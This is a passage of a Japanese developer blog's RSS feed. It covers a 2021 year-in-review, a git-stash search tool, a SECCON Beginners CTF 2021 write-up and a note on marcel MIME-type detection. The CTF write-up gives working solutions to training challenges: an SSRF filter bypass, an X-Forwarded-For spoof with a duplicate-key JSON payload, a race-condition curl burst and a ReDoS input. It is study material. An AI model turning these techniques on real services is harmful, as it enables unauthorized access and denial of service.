あと基本的に今までですます口調だったんだけど、なんか自分で読んでて変に感じるようになってきたのでしばらくは「だ・である」で書いていくことにした。&lt;/p>
&lt;section class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1" role="doc-endnote">
&lt;p>ルートディレクトリに自分が把握できない文字列が大量に書き込まれて不安になるだけなので完全に僕が悪い。&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/section></description></item><item><title>2021年の振り返り</title><link>https://qwyng.dev/posts/2021/12/30/191311/</link><pubDate>Thu, 30 Dec 2021 19:13:00 +0900</pubDate><guid>https://qwyng.dev/posts/2021/12/30/191311/</guid><description>&lt;body>
&lt;p>年初に引っ越して東京を出ました。今まで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EF%A5%F3%A5%EB%A1%BC%A5%E0">ワンルーム&lt;/a>5畳に190cmの人間が存在する限界状態だったので広いところに引っ越しました。家の中で歩けると便利。&lt;br>
4月は情報処理安全確保支援士試験合格したのと大学院に入学しました。最低学費になる3年間の間に卒業したいところ。&lt;br>
残りの八ヶ月はレポートしたり授業受けたりしてました。2/4期分の成績がでていて11単位です。卒業に32単位必要なのでやっていき。&lt;br>
C使った並列処理の実装とか面白い授業が結構ありました。CPUがキャッシュミスするか？とかパイプライン&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF">レジスタ&lt;/a>ってなんであるの？とか考えるのは大学院っぽくてよかったです。
勿論いいことだけじゃなくて、大学の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%D1%A5%B3%A5%F3">スパコン&lt;/a>に340GB以上のテキストファイル生成しちゃって怒られが発生したり単位落としたり色々ありました。&lt;br>
正直今年は去年と比べてアウトプットが少なかったし来年はもうちょい頑張りたいところですね。あと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%CF%A4%C6%A4%CA%A5%D6%A5%ED%A5%B0">はてなブログ&lt;/a>が最&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B6%E1%C0%EB">近宣&lt;/a>伝の仕方が自分の嫌いな感じになってきたのでちゃんと自分で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%E1%A5%A4%A5%F3">ドメイン&lt;/a>買って運用しようかなと思います。qwy.ngのための.ng&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%E1%A5%A4%A5%F3">ドメイン&lt;/a>かqwyn.ggのためのgg&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C9%A5%E1%A5%A4%A5%F3">ドメイン&lt;/a>どっちかほしいんですけどどっちも普通に高くて困ってます。&lt;br>
来年も人生をやっていきですな〜〜〜〜〜〜〜〜〜〜〜〜〜〜！&lt;/p>
&lt;/body></description></item><item><title>stashを検索するGitHub CLI Extensionを書いた</title><link>https://qwyng.dev/posts/2021/10/24/161057/</link><pubDate>Sun, 24 Oct 2021 16:10:00 +0900</pubDate><guid>https://qwyng.dev/posts/2021/10/24/161057/</guid><description>&lt;body>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/entry/2020/06/22/230935">一年前stashを検索するCLIツールをRustで書いた&lt;/a>のだが、正直実用に耐えるものではなかったのでどこかで作り直したいと思っていた。そんなことを考えているうちに世の中に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/GitHub">GitHub&lt;/a> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/CLI">CLI&lt;/a> Extensionという概念ができていたので、ちょうどいいと思って書いた。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2Fgh-stashes" title="GitHub - QWYNG/gh-stashes: GitHub CLI extension for search your stash list and apply it" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/gh-stashes">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20211024/20211024112645.gif" alt="f:id:sasa5740:20211024112645g:plain" width="1014" height="590" loading="lazy" title="" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;p>基本 &lt;code>git stash list -G&amp;lt;regexp&amp;gt;&lt;/code>をfzfにバインドして&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/preview">preview&lt;/a>に&lt;code>git stash show -p&lt;/code>しているだけなのだが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/grep">grep&lt;/a>と違ってgit stash list -G は空文字のクエリを投げると何にもマッチせず出力しないという挙動をするため、起動時のクエリなしの時に表示するリストをいい感じにしたり、クエリを入力したけどマッチしてない時とクエリを入力したのにマッチした時２つのケースをサポートしたりするのがまぁまぁ面倒だった。&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/preview">preview&lt;/a>では&lt;code>git stash show -p -G&amp;lt;query&amp;gt;&lt;/code>しているのだけど、マッチした文字が含まれるファイルが表示されるという方式なので行数が多いファイルだとあんまり&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/grep">grep&lt;/a>している感じがでない、ハイライトしたりいい感じに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/preview">preview&lt;/a>する方法はまだありそう。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/GitHub">GitHub&lt;/a> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/CLI">CLI&lt;/a>から簡単にインストールできるのでぜひ使ってみてください。&lt;/p>
&lt;/body></description></item><item><title>SECCON Beginners CTF 2021 writeup</title><link>https://qwyng.dev/posts/2021/05/23/173710/</link><pubDate>Sun, 23 May 2021 17:37:00 +0900</pubDate><guid>https://qwyng.dev/posts/2021/05/23/173710/</guid><description>&lt;body>
&lt;p>@hyper0dietterさんに誘われて&lt;a href="https://score.beginners.azure.noc.seccon.jp/">SECCON Beginners CTF 2021&lt;/a>に参加してきました。
チームの最終順位は1033点で157位です。一時は80位になって二人で興奮してました。&lt;/p>
&lt;p>自分は主にWebやってました。最後のmagicはあんまり時間もなくて通せずじまい。
@hyper0dietterさんはcryptoでなんがすごい数学使っててすごかった（小並）。&lt;/p>
&lt;ul class="table-of-contents">
&lt;li>
&lt;a href="#Web">Web&lt;/a>&lt;ul>
&lt;li>&lt;a href="#check_url">check_url&lt;/a>&lt;/li>
&lt;li>&lt;a href="#json">json&lt;/a>&lt;/li>
&lt;li>&lt;a href="#cant_use_db">cant_use_db&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;a href="#misc">misc&lt;/a>&lt;ul>
&lt;li>&lt;a href="#Mail_Address_Validator">Mail_Address_Validator&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#%E6%84%9F%E6%83%B3">感想&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="Web">Web&lt;/h3>
&lt;h4 id="check_url">check_url&lt;/h4>
&lt;p>URLをPOSTするとそこに&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/curl">curl&lt;/a>してくれるアプリ。&lt;/p>
&lt;pre class="code lang-php" data-lang="php" data-unlink> &amp;lt;!-- HTML Template --&amp;gt;
&amp;lt;?php
error_reporting(0);
if ($_SERVER["REMOTE_ADDR"] === "127.0.0.1"){
echo "Hi, Admin or SSSSRFer&amp;lt;br&amp;gt;";
echo "********************FLAG********************";
}else{
echo "Here, take this&amp;lt;br&amp;gt;";
$url = $_GET["url"];
if ($url !== "https://www.example.com"){
$url = preg_replace("/[^a-zA-Z0-9\/:]+/u", "👻", $url); //Super sanitizing
}
if(stripos($url,"localhost") !== false || stripos($url,"apache") !== false){
die("do not hack me!");
}
echo "URL: ".$url."&amp;lt;br&amp;gt;";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 2000);
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
echo "&amp;lt;iframe srcdoc='";
curl_exec($ch);
echo "' width='750' height='500'&amp;gt;&amp;lt;/iframe&amp;gt;";
curl_close($ch);
}
?&amp;gt;
&amp;lt;!-- HTML Template --&amp;gt;
&lt;/pre>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/localhost">localhost&lt;/a>に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/curl">curl&lt;/a>させられれば良いですね、しかし単純に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/localhost">localhost&lt;/a>指定すると弾かれてしまいます。&lt;br>
&lt;code>curl 127.0.0.1&lt;/code>は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C0%B5%B5%AC%C9%BD%B8%BD">正規表現&lt;/a>の置換により &lt;code>.&lt;/code>が置換されてしまいます。最初は &lt;code>:&lt;/code>が置換除外されているのもあり&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ipv6">ipv6&lt;/a>で指定すれば良いのかと思いましたが、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/curl">curl&lt;/a>に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ipv6">ipv6&lt;/a>アドレスそのまま渡すには&lt;br>
&lt;code>curl [0:0:0:0:0:ffff:7f00:0001]&lt;/code>
のようにアドレスをくくる必要があるらしく、&lt;code>[&lt;/code>が置換されてしまい駄目でした。&lt;br>
最終的に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ipv4">ipv4&lt;/a>アドレスを&lt;code>.&lt;/code> 無しにすれば良いと気づいて16進数にしたら通りました。&lt;code>0x7F000001&lt;/code>をフォームからPOSTすればOK。&lt;/p>
&lt;h4 id="json">&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/json">json&lt;/a>&lt;/h4>
&lt;p>社内ネットワーク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%AB%A4%E9%A4%B7">からし&lt;/a>か情報閲覧できない（らしい）社内アプリケーション。
bffアプリと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/api">api&lt;/a>アプリで別れてます。nginxに直接つながっているのはbffのみ。&lt;/p>
&lt;pre class="code lang-go" data-lang="go" data-unlink> // bff/main.go
package main
import (
"bytes"
"encoding/json"
"io/ioutil"
"net"
"net/http"
"github.com/gin-gonic/gin"
)
type Info struct {
ID int `json:"id" binding:"required"`
}
// check if the accessed user is in the local network (192.168.111.0/24)
func checkLocal() gin.HandlerFunc {
return func(c *gin.Context) {
clientIP := c.ClientIP()
ip := net.ParseIP(clientIP).To4()
if ip[0] != byte(192) || ip[1] != byte(168) || ip[2] != byte(111) {
c.HTML(200, "error.tmpl", gin.H{
"ip": clientIP,
})
c.Abort()
return
}
}
}
func main() {
r := gin.Default()
r.Use(checkLocal())
r.LoadHTMLGlob("templates/*")
r.GET("/", func(c *gin.Context) {
c.HTML(200, "index.html", nil)
})
r.POST("/", func(c *gin.Context) {
// get request body
body, err := ioutil.ReadAll(c.Request.Body)
if err != nil {
c.JSON(400, gin.H{"error": "Failed to read body."})
return
}
// parse json
var info Info
if err := json.Unmarshal(body, &amp;amp;info); err != nil {
c.JSON(400, gin.H{"error": "Invalid parameter."})
return
}
// validation
if info.ID &amp;lt; 0 || info.ID &amp;gt; 2 {
c.JSON(400, gin.H{"error": "ID must be an integer between 0 and 2."})
return
}
if info.ID == 2 {
c.JSON(400, gin.H{"error": "It is forbidden to retrieve Flag from this BFF server."})
return
}
// get data from api server
req, err := http.NewRequest("POST", "http://api:8000", bytes.NewReader(body))
if err != nil {
c.JSON(400, gin.H{"error": "Failed to request API."})
return
}
req.Header.Set("Content-Type", "application/json")
client := new(http.Client)
resp, err := client.Do(req)
if err != nil {
c.JSON(400, gin.H{"error": "Failed to request API."})
return
}
defer resp.Body.Close()
result, err := ioutil.ReadAll(resp.Body)
if err != nil {
c.JSON(400, gin.H{"error": "Failed to request API."})
return
}
c.JSON(200, gin.H{"result": string(result)})
})
if err := r.Run(":8080"); err != nil {
panic("server is not started")
}
}
&lt;/pre>
&lt;pre class="code lang-go" data-lang="go" data-unlink> // api/main.go
package main
import (
"io/ioutil"
"os"
"github.com/buger/jsonparser"
"github.com/gin-gonic/gin"
)
func main() {
r := gin.Default()
r.POST("/", func(c *gin.Context) {
body, err := ioutil.ReadAll(c.Request.Body)
if err != nil {
c.String(400, "Failed to read body")
return
}
id, err := jsonparser.GetInt(body, "id")
if err != nil {
c.String(400, "Failed to parse json")
return
}
if id == 0 {
c.String(200, "The quick brown fox jumps over the lazy dog.")
return
}
if id == 1 {
c.String(200, "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.")
return
}
if id == 2 {
// Flag!!!
flag := os.Getenv("FLAG")
c.String(200, flag)
return
}
c.String(400, "No data")
})
if err := r.Run(":8000"); err != nil {
panic("server is not started")
}
}
&lt;/pre>
&lt;p>この問題は２つ関門があります。&lt;br>
1つ目はbff/main.goの&lt;code>checkLocal()&lt;/code>の突破です。nginxの設定ファイルを見てみます。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> server {
listen 80;
listen [::]:80;
server_name localhost;
location / {
proxy_pass http://bff:8080;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
}
error_page 500 502 503 504 /50x.html;
location = /50x.html {
root /usr/share/nginx/html;
}
} &lt;/pre>
&lt;p>&lt;a href="https://nginx.org/en/docs/http/ngx_http_proxy_module.html#var_proxy_add_x_forwarded_for">$proxy_add_x_forwarded_for&lt;/a>をそのまま渡してるのでX-Forwarded-Forの改ざんは容易です。リク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9">エス&lt;/a>トヘッダでX-Forwarded-ForをいじればOK。&lt;/p>
&lt;p>2つ目はbffでの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/json">json&lt;/a>チェックの回避です。
&lt;code>{ "id": 2 }&lt;/code>を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/api">api&lt;/a>サーバーに送信したいのですが、bffのチェックに弾かれてしまいます。
bffと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/api">api&lt;/a>の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/json">json&lt;/a>のパースの仕方が違うことに着目して、試しに&lt;code>{"id": 2, "id": 0}&lt;/code>を渡したらbffのinfo構造体には0が&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%DE%A5%C3%A5%D4%A5%F3%A5%B0">マッピング&lt;/a>されて、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/api">api&lt;/a>の&lt;code>jsonparser.GetInt(body, "id")&lt;/code>では2を渡せたのでこれで解けました。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> curl -k 'https://json.quals.beginners.seccon.jp/' \
-X POST \
-H 'X-Forwarded-For:192.168.111.0' \
-d '{"id": 2, "id": 0}' &lt;/pre>
&lt;h4 id="cant_use_db">cant_use_db&lt;/h4>
&lt;p>DBではなく&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%A4%A5%EB%A5%B7%A5%B9%A5%C6%A5%E0">ファイルシステム&lt;/a>に直接writeして情報を永続化してるアプリ。&lt;/p>
&lt;pre class="code lang-python" data-lang="python" data-unlink> import os
import re
import time
import random
import shutil
import secrets
import datetime
from flask import Flask, render_template, session, redirect
app = Flask(__name__)
app.secret_key = secrets.token_bytes(256)
def init_userdata(user_id):
try:
os.makedirs(f"./users/{user_id}", exist_ok=True)
open(f"./users/{user_id}/balance.txt", "w").write("20000")
open(f"./users/{user_id}/noodles.txt", "w").write("0")
open(f"./users/{user_id}/soup.txt", "w").write("0")
return True
except:
return False
def get_userdata(user_id):
try:
balance = open(f"./users/{user_id}/balance.txt").read()
noodles = open(f"./users/{user_id}/noodles.txt").read()
soup = open(f"./users/{user_id}/soup.txt").read()
return [int(i) for i in [balance, noodles, soup]]
except:
return [0] * 3
@app.route("/")
def top_page():
user_id = session.get("user")
if not user_id:
dirnames = datetime.datetime.now()
user_id = f"{dirnames.hour}{dirnames.minute}/" + secrets.token_urlsafe(30)
if not init_userdata(user_id):
return redirect("/")
session["user"] = user_id
userdata = get_userdata(user_id)
info = {
"user_id": re.sub("^[0-9]*?/", "", user_id),
"balance": userdata[0],
"noodles": userdata[1],
"soup": userdata[2]
}
return render_template("index.html", info = info)
@app.route("/buy_noodles", methods=["POST"])
def buy_noodles():
user_id = session.get("user")
if not user_id:
return redirect("/")
balance, noodles, soup = get_userdata(user_id)
if balance &amp;gt;= 10000:
noodles += 1
open(f"./users/{user_id}/noodles.txt", "w").write(str(noodles))
time.sleep(random.uniform(-0.2, 0.2) + 1.0)
balance -= 10000
open(f"./users/{user_id}/balance.txt", "w").write(str(balance))
return "💸$10000"
return "ERROR: INSUFFICIENT FUNDS"
@app.route("/buy_soup", methods=["POST"])
def buy_soup():
user_id = session.get("user")
if not user_id:
return redirect("/")
balance, noodles, soup = get_userdata(user_id)
if balance &amp;gt;= 20000:
soup += 1
open(f"./users/{user_id}/soup.txt", "w").write(str(soup))
time.sleep(random.uniform(-0.2, 0.2) + 1.0)
balance -= 20000
open(f"./users/{user_id}/balance.txt", "w").write(str(balance))
return "💸💸$20000"
return "ERROR: INSUFFICIENT FUNDS"
@app.route("/eat")
def eat():
user_id = session.get("user")
if not user_id:
return redirect("/")
balance, noodles, soup = get_userdata(user_id)
shutil.rmtree(f"./users/{user_id}/")
session["user"] = None
if (noodles &amp;gt;= 2) and (soup &amp;gt;= 1):
return os.getenv("CTF4B_FLAG")
if (noodles &amp;gt;= 2):
return "The noodles seem to get stuck in my throat."
if (soup &amp;gt;= 1):
return "This is soup, not ramen."
return "Please make ramen."
if __name__ == "__main__":
app.run()
&lt;/pre>
&lt;p>セッションごとに所持金20000円で40000円分の買い物をしてねという問題。当然普通に順番にPOSTしても解けないです。&lt;br>
着眼点は明らかに怪しい&lt;code>time.sleep(random.uniform(-0.2, 0.2) + 1.0)&lt;/code>です。&lt;br>
買い物処理中に別の買い物プロセスを発火させれば他のプロセスがbalanceを書き換える前にbalanceチェックを突破することができます。
セッションだけセットして非同期で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/curl">curl&lt;/a>。&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> curl -k 'https://cant-use-db.quals.beginners.seccon.jp/buy_soup' \
-X 'POST' \
-H 'cookie: session=SESSION' &amp;amp;
curl -k 'https://cant-use-db.quals.beginners.seccon.jp/buy_noodles' \
-X 'POST' \
-H 'cookie: session=SESSION' &amp;amp;
curl -k 'https://cant-use-db.quals.beginners.seccon.jp/buy_noodles' \
-X 'POST' \
-H 'cookie: session=SESSION'
&lt;/pre>
&lt;p>この後同じセッションつかって/eatをGETすればOK。&lt;/p>
&lt;h3 id="misc">misc&lt;/h3>
&lt;h4 id="Mail_Address_Validator">Mail_Address_Validator&lt;/h4>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> #!/usr/bin/env ruby
require 'timeout'
$stdout.sync = true
$stdin.sync = true
pattern = /\A([\w+\-].?)+@[a-z\d\-]+(\.[a-z]+)*\.[a-z]+\z/i
begin
Timeout.timeout(60) {
Process.wait Process.fork {
puts "I check your mail address."
puts "please puts your mail address."
input = gets.chomp
begin
Timeout.timeout(5) {
if input =~ pattern
puts "Valid mail address!"
else
puts "Invalid mail address!"
end
}
rescue Timeout::Error
exit(status=14)
end
}
case Process.last_status.to_i &amp;gt;&amp;gt; 8
when 0 then
puts "bye."
when 1 then
puts "bye."
when 14 then
File.open("flag.txt", "r") do |f|
puts f.read
end
else
puts "What's happen?"
end
}
rescue Timeout::Error
puts "bye."
end
&lt;/pre>
&lt;p>いわゆるRedosの問題。メールアドレスに対する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C0%B5%B5%AC%C9%BD%B8%BD">正規表現&lt;/a>のチェックに負荷をかけろというもの。一応60秒の制限もありクソデカ文字列では突破できません。&lt;/p>
&lt;p>この問題については銀座&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>で全く同じ話を聞いたことがあったのでその方の素晴らしい資料を貼っておきます。&lt;/p>
&lt;p>&lt;iframe id="talk_frame_512169" src="//speakerdeck.com/player/ea7667a08d3e4a7ab7cd5c1ef5352d46" width="710" height="532" style="border:0; padding:0; margin:0; background:transparent;" frameborder="0" allowtransparency="true" allowfullscreen="allowfullscreen" mozallowfullscreen="true" webkitallowfullscreen="true">&lt;/iframe> &lt;cite class="hatena-citation">&lt;a href="https://speakerdeck.com/expajp/sofalsezheng-gui-biao-xian-yi-yi-ari-redosnituite">speakerdeck.com&lt;/a>&lt;/cite>&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> ~ nc mail-address-validator.quals.beginners.seccon.jp 5100
I check your mail address.
please puts your mail address.
username@host.abcde.abcde.abcde.abcde.abcde.abcde.abcde.abcde.abcde. &lt;/pre>
&lt;p>でOK&lt;/p>
&lt;h3 id="感想">感想&lt;/h3>
&lt;p>webの最初の問題が時事ネタで笑いました。事件を聞いて作成したのか元々この問題だったのかはわかりません。&lt;br>
CTFのwebを解いているといつも感じることですが、典型的なものも多いし明らかにヤバいコードの実例がわかるので、Web系企業の研修に最適だと思います。自分もX-Forwarded-Forはこの問題で初めて知りました。&lt;br>
運営の皆様ありがとうございました。楽しかったです。&lt;/p>
&lt;/body></description></item><item><title>mimemagicに依存しなくなったmarcelのmime type判定の変化には気をつけようって話</title><link>https://qwyng.dev/posts/2021/03/29/223635/</link><pubDate>Mon, 29 Mar 2021 22:36:00 +0900</pubDate><guid>https://qwyng.dev/posts/2021/03/29/223635/</guid><description>&lt;body>
&lt;p>mimemagic gemのライセンス問題で色々ありましたね。ライセンスは法的な問題なので確認も難しい問題でした。&lt;/p>
&lt;p>さて、marcelからmimemagicへの依存が無くなって&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/mime">mime&lt;/a> typeの判定が&lt;a href="https://tika.apache.org/">Apache Tika&lt;/a>を元にしたものになりました。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fhackmd.io%2F%40mametter%2Fmimemagic-info-ja" title="mimemagicの最新動向 - HackMD" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://hackmd.io/@mametter/mimemagic-info-ja">hackmd.io&lt;/a>&lt;/cite>&lt;/p>
&lt;p>しかし、この変更にはmarcelの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/mime">mime&lt;/a> type判定結果が変化するものが含まれていました。&lt;br>
例えば、以下のsample.xlsxというファイルの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/mime">mime&lt;/a> typeの判定をMarcel: 1.0.0、0,3,3それぞれに行わせると...&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> ❯ xxd sample.xlsx
00000000: 504b 0304 1400 0808 0800 3123 7d52 0000 PK........1#}R..
00000010: 0000 0000 0000 0000 0000 1800 0000 786c ..............xl
00000020: 2f64 7261 7769 6e67 732f 6472 6177 696e /drawings/drawin
00000030: 6731 2e78 6d6c 9dd0 5d6e c230 0c07 f013 g1.xml..]n.0....
00000040: ec0e 55de 695a 1813 4314 5ed0 4e30 0ee0 ..U.iZ..C.^.N0..
00000050: 256e 1b91 8fca 0ea3 dc7e d14a 3669 7b01 %n.......~.J6i{.
00000060: 1e6d cb3f f9ef cd6e 74b6 f844 6213 7c23 .m.?...nt..Db.|#
❯ file -i sample.xlsx
sample.xlsx: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet; charset=binary &lt;/pre>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> irb(main):001:0&amp;gt; require 'marcel'
=&amp;gt; true
irb(main):002:0&amp;gt; Marcel::VERSION
=&amp;gt; "1.0.0"
irb(main):003:0&amp;gt; require 'pathname'
=&amp;gt; true
irb(main):004:0&amp;gt; Marcel::MimeType.for Pathname.new('sample.xlsx')
=&amp;gt; "application/zip"
&lt;/pre>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> irb(main):001:0&amp;gt; require 'marcel'
=&amp;gt; true
irb(main):002:0&amp;gt; Marcel::VERSION
=&amp;gt; "0.3.3"
irb(main):003:0&amp;gt; require 'pathname'
=&amp;gt; true
irb(main):004:0&amp;gt; Marcel::MimeType.for Pathname.new('sample.xlsx')
=&amp;gt; "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
&lt;/pre>
&lt;p>このように同じファイルに対して判定結果が異なっています。&lt;/p>
&lt;p>この理由はmarcelのmimemagicをreplaceした差分でわかります。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Frails%2Fmarcel%2Fcommit%2F2e58d1986715420f0abbba060b6e158d6f4d3a05%23diff-9b02d25e1e56ac702cc60a32120253b3de0635f6ee9893631eea95ef5744b77aL2" title="Replace mimemagic with Apache Tika's mime types data · rails/marcel@2e58d19" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/rails/marcel/commit/2e58d1986715420f0abbba060b6e158d6f4d3a05#diff-9b02d25e1e56ac702cc60a32120253b3de0635f6ee9893631eea95ef5744b77aL2">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>marcelは&lt;code>lib/marcel/mime_type/definitions.rb&lt;/code>内にて &lt;code>'require 'mimemagic/overlay'&lt;/code>していました。
&lt;code>mimemagic/overlay&lt;/code>はxlsxやらpptやらをapplication/zipと区別してくれる&lt;code>MimeMagic.add&lt;/code>をしていたファイルです。&lt;br>
最初に貼ったmimemagic最新動向の記事でも触れられていましたね。&lt;/p>
&lt;p>この&lt;code>'require 'mimemagic/overlay'&lt;/code>が無くなったことによってmarcelはxlsxやらpptをapplication/zipと判定するようになりました。&lt;a href="#f-96753e88" name="fn-96753e88" title="一部のxlsxとかpptはmarcel 1.0.0でもそのままapplication/zipと区別してくれるかもしれません。マジックナンバーにあまり詳しくないのでわかりませんが、特定のマジックナンバーを持つxlsxとかpptも存在するかも">*1&lt;/a>&lt;/p>
&lt;p>marcelのREADMEにはもともと&lt;/p>
&lt;blockquote>
&lt;p>By preference, the magic number data in any passed in file is used to determine the type. If this doesn't work, it uses the type gleaned from the filename, extension, and finally the declared type. If no valid type is found in any of these, "application/octet-stream" is returned.&lt;/p>
&lt;p>Some types aren't easily recognised solely by magic number data. For example &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Adobe%20Illustrator">Adobe Illustrator&lt;/a> files have the same magic number as PDFs (and can usually even be viewed in PDF viewers!). For these types, Marcel uses both the magic number data and the file name to work out the type:&lt;/p>
&lt;/blockquote>
&lt;p>とあるので、書いてある通りファイル名を渡すのがとりあえずの対処策になるかと思います。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> irb(main):001:0&amp;gt; require 'marcel'
=&amp;gt; true
irb(main):002:0&amp;gt; Marcel::VERSION
=&amp;gt; "1.0.0"
irb(main):003:0&amp;gt; require 'pathname'
=&amp;gt; true
irb(main):004:0&amp;gt; Marcel::MimeType.for Pathname.new('sample.xlsx')
=&amp;gt; "application/zip"
irb(main):005:0&amp;gt; Marcel::MimeType.for Pathname.new('sample.xlsx'), name: 'sample.xlsx'
=&amp;gt; "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
&lt;/pre>
&lt;p>&lt;code>shrine&lt;/code>には&lt;a href="https://github.com/shrinerb/shrine/blob/master/doc/plugins/determine_mime_type.md">そういったオプション&lt;/a>もありますね。&lt;/p>
&lt;p>xlsxとかpptを扱う&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>アプリはそれなりに存在するでしょうから各位気をつけていきましょう。&lt;/p>
&lt;p>追記&lt;/p>
&lt;p>@furish さんがPR投げてくれてますね　ある場でこの人と話した内容がこの記事の発端でもあります。
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Frails%2Fmarcel%2Fissues%2F35" title="compatibility is broken with certain types of office documents · Issue #35 · rails/marcel" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/rails/marcel/issues/35">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;div class="footnote">
